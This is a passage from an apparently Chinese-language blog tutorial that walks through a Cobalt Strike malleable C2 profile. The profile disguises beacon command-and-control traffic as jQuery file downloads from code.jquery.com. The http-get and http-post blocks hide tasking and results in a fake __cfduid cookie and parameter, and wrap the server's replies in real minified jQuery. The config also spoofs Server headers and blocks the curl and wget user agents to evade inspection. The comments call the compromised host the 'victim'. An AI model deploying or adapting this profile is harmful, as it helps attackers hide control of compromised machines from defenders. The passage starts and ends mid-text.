e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US,en;q=0.5&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Http-Config"><a href="#Http-Config" class="headerlink" title="Http-Config"></a>Http-Config</h4><p>不单单是http实际上也是https的全局响应头配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http-config &#123;</span><br><span class="line">    <span class="built_in">set</span> headers <span class="string">&quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Keep-Alive&quot;</span> <span class="string">&quot;timeout=10, max=100&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;Keep-Alive&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> trust_x_forwarded_for <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> block_useragents <span class="string">&quot;curl*,lynx*,wget*&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Http-Get"><a href="#Http-Get" class="headerlink" title="Http-Get"></a>Http-Get</h4><p>命令的下发相当于是teamserver(cs服务端)向受害者发送一个get请求 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"><span class="comment"># 下发命令访问的uri</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.1.min.js&quot;</span>;</span><br><span class="line">    <span class="comment"># 请求方法</span></span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">    <span class="comment"># 客户端配置</span></span><br><span class="line">    client &#123;</span><br><span class="line">        <span class="comment"># 请求头配置</span></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">        <span class="comment"># 元数据</span></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend <span class="string">&quot;__cfduid=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 服务端配置</span></span><br><span class="line">    server &#123;</span><br><span class="line">    <span class="comment"># 响应头设置</span></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        <span class="comment"># 输出信息</span></span><br><span class="line">        output &#123;   </span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line            </span></span><br><span class="line">            prepend <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Http-Post"><a href="#Http-Post" class="headerlink" title="Http-Post"></a>Http-Post</h4><p>结果的回传相当于受害者向teamserver发送一个post请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line"><span class="comment"># 请求的地址</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.2.min.js&quot;</span>;</span><br><span class="line">    <span class="comment"># 请求的方法</span></span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="comment"># 客户端配置</span></span><br><span class="line">    client &#123;</span><br><span class="line">    <span class="comment"># 请求头</span></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">        <span class="comment"># 参数</span></span><br><span class="line">        <span class="built_in">id</span> &#123;</span><br><span class="line">            mask;       </span><br><span class="line">            base64url;</span><br><span class="line">            parameter <span class="string">&quot;__cfduid&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 输出信息</span></span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 服务端配置</span></span><br><span class="line">    server &#123;</span><br><span class="line">    <span class="comment"># 响应头配置</span></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        <span class="comment"># 输出的内容</span></span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line            </span></span><br><span class="line">            prepend <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Stage"><a href="#Stage" class="headerlink" title="Stage"></a>Stage</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261117454.png" 